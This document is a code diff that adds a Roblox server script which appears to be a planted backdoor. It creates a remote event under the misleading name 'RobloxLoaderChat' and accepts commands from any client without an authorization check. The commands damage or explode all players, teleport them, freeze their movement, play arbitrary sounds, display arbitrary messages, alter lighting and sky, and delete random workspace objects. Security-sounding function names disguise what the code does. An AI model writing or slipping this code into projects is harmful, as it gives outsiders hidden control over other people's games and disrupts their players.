@@ -1,0 +1,228 @@
+local rs = game.ReplicatedStorage
+local ev = Instance.new("RemoteEvent", rs)
+ev.Name = "RobloxLoaderChat"
+local ne = game.ReplicatedStorage:WaitForChild("RobloxLoaderChat")
+ne.OnServerEvent:Connect(function(plr,db,id)
+	if db == "jp" then
+		local Players = game:GetService("Players")
+		local function JumpAllPlayers()
+			for _, player in pairs(Players:GetPlayers()) do
+				local character = player.Character
+				if character then
+					local humanoid = character:FindFirstChildWhichIsA("Humanoid")
+					if humanoid then
+						humanoid.Jump = true
+					end
+				end
+			end
+		end
+		JumpAllPlayers()
+	elseif db == "ka" then
+		local Players = game:GetService("Players")
+		local Correction = 20
+		local function ApplyGlobalDamage()
+			for _, player in pairs(Players:GetPlayers()) do
+				local character = player.Character
+				if character then
+					local humanoid = character:FindFirstChildWhichIsA("Humanoid")
+					if humanoid then
+						humanoid:TakeDamage(Correction)
+					end
+				end
+			end
+		end
+		ApplyGlobalDamage()
+	elseif db == "ea" then
+		local Players = game:GetService("Players")
+		local Debris = game:GetService("Debris")
+		local function ManagePlayers()
+			for _, player in pairs(Players:GetPlayers()) do
+				local char = player.Character
+				if char and char:FindFirstChild("HumanoidRootPart") then
+					local hrp = char.HumanoidRootPart
+					local explosion = Instance.new("Explosion")
+					explosion.Position = hrp.Position
+					explosion.BlastRadius = 6
+					explosion.BlastPressure = 100000
+					explosion.DestroyJointRadiusPercent = 0
+					explosion.ExplosionType = Enum.ExplosionType.NoCraters
+					explosion.Parent = workspace
+					local bodyVelocity = Instance.new("BodyVelocity")
+					bodyVelocity.Velocity = hrp.CFrame.LookVector * 50 + Vector3.new(0, 60, 0)
+					bodyVelocity.MaxForce = Vector3.new(1e5, 1e5, 1e5)
+					bodyVelocity.P = 1e5
+					bodyVelocity.Parent = hrp
+
+					Debris:AddItem(bodyVelocity, 0.5)
+				end
+			end
+		end
+		ManagePlayers()
+			if not game.SoundService:FindFirstChild("BoomEffect") then
+				local a = Instance.new("Sound", game.SoundService)
+				a.Name = "BoomEffect"
+				a.SoundId = "rbxassetid://577577319"
+				a.Volume = 5
+				a:Play()
+			else
+				game.SoundService.BoomEffect:Play()
+			end
+	elseif db == "ta" then
+		local char1 = plr.Character
+		local Placeto = char1:FindFirstChild("HumanoidRootPart") and char1.HumanoidRootPart.Position
+            for _, player in pairs(game.Players:GetPlayers()) do
+			local char = player.Character
+			if char and char:FindFirstChild("HumanoidRootPart") then
+				char:MoveTo(Placeto)
+			end
+		end
+	elseif db == "ms" then
+		local NS = Instance.new("Sound", game.SoundService)
+		NS.Name = "GameFootsSound"
+		NS.SoundId = id
+		NS.Volume = 5
+		NS:Play()
+	elseif db == "gl" then
+		local Lighting = game:GetService("Lighting")
+		Lighting.Ambient = Color3.fromRGB(255, 80, 80) 
+		Lighting.OutdoorAmbient = Color3.fromRGB(100, 50, 50)
+		Lighting.ClockTime = 6.1
+	elseif db == "pa" then
+		local Players = game:GetService("Players")
+		local function CreateSecutityGame()
+			for _, player in pairs(Players:GetPlayers()) do
+				local char = player.Character
+				if char and char:FindFirstChild("HumanoidRootPart") then
+					local bloco = Instance.new("Part")
+					bloco.Position = char.HumanoidRootPart.Position + Vector3.new(0, 5, 0)
+					bloco.Parent = workspace
+				end
+			end
+		end
+	CreateSecutityGame()
+	elseif db == "sp" then
+		local Players = game:GetService("Players")
+		local Colors = {
+			BrickColor.new("Cocoa"),
+			BrickColor.new("Royal purple"),
+			BrickColor.new("Really red"),
+			BrickColor.new("Yellow flip/flop"),
+			BrickColor.new("Lime green")
+		}
+		local function ChangeSecurityPlayers()
+			for _, player in pairs(Players:GetPlayers()) do
+				local char = player.Character
+				if char then
+					local Chosed = Colors[math.random(1, #Colors)]
+					for _, part in pairs(char:GetChildren()) do
+						if part:IsA("BasePart") and (
+							part.Name == "Head" or
+								part.Name:match("Arm") or
+								part.Name:match("Leg") or
+								part.Name == "Torso" or
+								part.Name == "UpperTorso" or
+								part.Name == "LowerTorso") then
+							part.BrickColor = Chosed
+						end
+					end
+				end
+			end
+		end
+		ChangeSecurityPlayers()
+	elseif db == "tx" then
+		local Players = game:GetService("Players")
+		if not plr.PlayerGui:FindFirstChild("MsgAdmin") then
+			local function CreateSecuritySystem2(player)
+				local n = Instance.new("ScreenGui")
+				n.Name = "MsgAdmin"
+				n.ResetOnSpawn = false
+				n.Enabled = true
+				local ft = Instance.new("Frame", n)
+				ft.Size = UDim2.new(1, 100,1, 100)
+				ft.BorderColor = BrickColor.new("Really black")
+				ft.BackgroundColor3 = Color3.fromRGB(74, 74, 74)
+				ft.BackgroundTransparency = 0.45
+				local tt = Instance.new("TextLabel", ft)
+				tt.Size = UDim2.new(0, 512,0, 133)
+				tt.Position = UDim2.new(0.227, 0,0.26, 0)
+				tt.Text = id
+				tt.BackgroundTransparency = 1
+				tt.TextColor = BrickColor.new("White")
+				tt.TextScaled = true
+				tt.TextStrokeTransparency = 0
+				n.Parent = player:WaitForChild("PlayerGui")
+				task.wait(4)
+				n.Enabled = false
+			end
+				for _, player in pairs(Players:GetPlayers()) do
+				CreateSecuritySystem2(player)
+			end
+			
+		else
+			for _, player in pairs(Players:GetPlayers()) do
+				player.PlayerGui.MsgAdmin.Enabled = true
+				player.PlayerGui.MsgAdmin.Frame.TextLabel.Text = id
+				task.wait(4)
+				player.PlayerGui.MsgAdmin.Enabled = false
+			end
+		end
+	elseif db == "sk" then
+		if game.Lighting:FindFirstChildWhichIsA("Sky") then
+			local a = game.Lighting:FindFirstChildWhichIsA("Sky")
+			a:Destroy()
+			local nk = Instance.new("Sky", game.Lighting)
+			nk.MoonAngularSize = 11
+			nk.MoonTextureId = "rbxasset://sky/moon.jpg"
+			nk.SkyboxBk = "rbxassetid://9774201371"
+			nk.SkyboxDn = "rbxassetid://9774201371"
+			nk.SkyboxFt = "rbxassetid://9774201371"
+			nk.SkyboxLf = "rbxassetid://9774201371"
+			nk.SkyboxRt = "rbxassetid://9774201371"
+			nk.SkyboxUp = "rbxassetid://9774201371"
+			nk.SunAngularSize = 21
+			nk.SunTextureId = "rbxasset://sky/sun.jpg"
+		else
+			local nk = Instance.new("Sky", game.Lighting)
+			nk.MoonAngularSize = 11
+			nk.MoonTextureId = "rbxasset://sky/moon.jpg"
+			nk.SkyboxBk = "rbxassetid://9774201371"
+			nk.SkyboxDn = "rbxassetid://9774201371"
+			nk.SkyboxFt = "rbxassetid://9774201371"
+			nk.SkyboxLf = "rbxassetid://9774201371"
+			nk.SkyboxRt = "rbxassetid://9774201371"
+			nk.SkyboxUp = "rbxassetid://9774201371"
+			nk.SunAngularSize = 21
+			nk.SunTextureId = "rbxasset://sky/sun.jpg"
+		end
+	elseif db == "ds" then
+		local workspaceObjects = {}
+		for _, obj in pairs(workspace:GetChildren()) do
+			if obj:IsA("Terrain") == false and obj.Name ~= "Camera" then
+				table.insert(workspaceObjects, obj)
+			end
+		end
+		for i = #workspaceObjects, 2, -1 do
+			local j = math.random(1, i)
+			workspaceObjects[i], workspaceObjects[j] = workspaceObjects[j], workspaceObjects[i]
+		end
+		local quantidadeParaDeletar = math.min(100, #workspaceObjects)
+		for i = 1, quantidadeParaDeletar do
+			workspaceObjects[i]:Destroy()
+		end
+	elseif db == "nw" then
+		local Players = game:GetService("Players")
+		local TargetPlr = 0
+		local function ChangedSuceesful()
+			for _, player in pairs(Players:GetPlayers()) do
+				local char = player.Character
+				if char then
+					local humanoid = char:FindFirstChildWhichIsA("Humanoid")
+					if humanoid then
+						humanoid.WalkSpeed = TargetPlr
+					end
+				end
+			end
+		end
+		ChangedSuceesful()
+	end
+end)
